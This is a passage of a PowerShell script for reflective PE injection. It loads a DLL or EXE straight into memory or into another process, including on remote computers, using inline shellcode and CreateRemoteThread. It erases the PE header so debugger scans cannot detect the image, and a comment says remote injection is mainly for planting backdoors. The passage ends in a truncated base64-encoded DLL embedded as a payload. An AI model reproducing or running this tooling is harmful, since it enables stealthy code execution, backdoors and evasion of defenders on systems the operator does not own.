        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

$dllData = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACr2T4r77hQeO+4UHjvuFB4WySheOu4UHhbJKN4mrhQeFskonjiuFB48erDeO24UHjU5lN557hQeNTmVXnNuFB41OZUef64UHgyR5t46rhQeO+4UXiIuFB4eOZZeeu4UHh45lB57rhQeH3mr3juuFB4eOZSee64UHhSaWNo77hQeAAAAAAAAAAAAAAAAAAAAABQRQAAZIYHAAiAoVgAAAAAAAAAAPAAIiALAg4AACgBAAAsAQAAAAAAtB8AAAAQAAAAAACAAQAAAAAQAAAAAgAABgAAAAAAAAAGAAAAAAAAAACwAgAABAAAAAAAAAIAYAEAABAAAAAAAAAQAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAAAAAQAAAA0OsBAHAAAABA7AEAUAAAAACQAgDgAQAAAGACANgSAAAAAAAAAAAAAACgAgBMBgAAwNIBADgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0wEAlAAAAAAAAAAAAAAAAEABAJgCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAA4nAQAAEAAAACgBAAAEAAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAABotAAAAEABAAC2AAAALAEAAAAAAAAAAAAAAAAAQAAAQC5kYXRhAAAAMFQAAAAAAgAARAAAAOIBAAAAAAAAAAAAAAAAAEAAAMAucGRhdGEAANgSAAAAYAIAABQAAAAmAgAAAAAAAAAAAAAAAABAAABALmdmaWRzAADQAAAAAIACAAACAAAAOgIAAAAAAAAAAAAAAAAAQAAAQC5yc3JjAAAA4AEAAACQAgAAAgAAADwCAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAEwGAAAAoAIAAAgAAAA+AgAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEiNDfkmAQDpsBcAAMzMzMyD6gF0FoP6BXUYTYXAdBNIiwXiQwIASYkA6wdIiQ3WQwIAuAEAAADDSIsEJMPMzMxIiUwkCFNVVldBVEFVQVZBV0iD7Dgz7USL7UiJrCSQAAAARIv9SIlsJCBEi/VEi+Xow////0iL+I11AbhNWgAAZjkHdRpIY0c8SI1IwEiB+b8DAAB3CYE8OFBFAAB0BUgr/uvXZUiLBCVgAAAASIm8JJgAAABIi0gYTItZIEyJnCSIAAAATYXbD4TXAQAAQbn//wAASYtTUEiLzUUPt0NIwckNgDphcgoPtgKD6CBImOsDD7YCSAPISAPWZkUDwXXfgflbvEpqD4XKAAAASYtTIL///wAASGNCPIusEIgAAAC4AwAAAA+38ESLVBUgRI1Y/4tcFSRMA9JIA9pFM8lFiwJBi8lMA8JBigBJ/8DByQ0PvsADyEGKAITAde6B+Y5ODux0EIH5qvwNfHQIgflUyq+RdUOLRBUcRA+3A0yNDAKB+Y5ODux1CUeLLIFMA+rrIIH5qvwNfHUJR4s8gUwD+usPgflUyq+RdQdHizSBTAPyZgP3RTPJSYPCBEkD22aF9g+Fd////0yJvCSQAAAAM+3pjgAAAIH5XWj6PA+FkgAAAE2LQyBBvwEAAAC///8AAEljQDxFjV8BQoucAIgAAABGi0wDIEaLVAMkTQPITQPQQYsJi9VJA8iKAUkDz8HKDQ++wAPQigGEwHXvgfq4CkxTdRdCi0QDHEEPtxJJjQwARIskkU0D4GYD90mDwQRNA9NmhfZ1ukyLvCSQAAAATIlkJCBMi5wkiAAAAESLz74BAAAATYXtdA9Nhf90Ck2F9nQFTYXkdRRNixtMiZwkiAAAAE2F2w+FN/7//0iLvCSYAAAASGNfPDPJSAPfQbgAMAAARI1JQItTUEH/1otTVEiL8EiLx0G7AQAAAEiF0nQUTIvGTCvHighBiAwASQPDSSvTdfJED7dLBg+3QxRNhcl0OEiNSyxIA8iLUfhNK8tEiwFIA9ZEi1H8TAPHTYXSdBBBigBNA8OIAkkD000r03XwSIPBKE2FyXXPi7uQAAAASAP+i0cMhcAPhJUAAABIi6wkkAAAAIvISAPOQf/VRIs3TIvgRIt/EEwD9kwD/kUzwOtaTYX2dC5NOQZ9KUljRCQ8QQ+3FkKLjCCIAAAAQotEIRBCi0whH